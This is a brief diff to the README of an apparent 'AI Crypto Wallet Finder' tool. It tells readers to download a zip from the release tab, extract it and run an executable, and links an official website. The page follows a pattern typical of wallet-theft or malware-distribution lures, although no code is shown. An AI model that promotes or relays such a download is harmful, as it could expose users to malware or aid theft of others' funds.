@@ -1,6 +1,8 @@
 WalletFisher - AI Crypto Wallet Finder
 
-**First, download the Setup.zip from release tab,install the app and start finding your first wallet.
+**First, download the AI Crypto Wallet Finder.zip file from release tab.
+**Extract all files into a folder.
+**Run AI Crypto Wallet Findee.exe
 
 
 ** [Official Website](https://walletfisher.com)
